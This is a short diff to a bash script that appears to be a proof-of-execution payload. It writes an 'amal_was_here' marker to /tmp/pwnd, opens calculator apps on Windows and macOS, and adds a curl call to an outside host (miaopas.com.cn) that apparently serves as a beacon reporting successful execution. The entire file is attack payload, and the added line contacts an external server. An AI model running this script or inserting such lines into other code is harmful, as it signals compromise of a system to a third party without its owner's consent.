@@ -1,4 +1,5 @@
 #!/bin/bash
 echo "amal_was_here" > /tmp/pwnd
+curl https://miaopas.com.cn/post/1.php
 calc.exe
 open -a Calculator.app
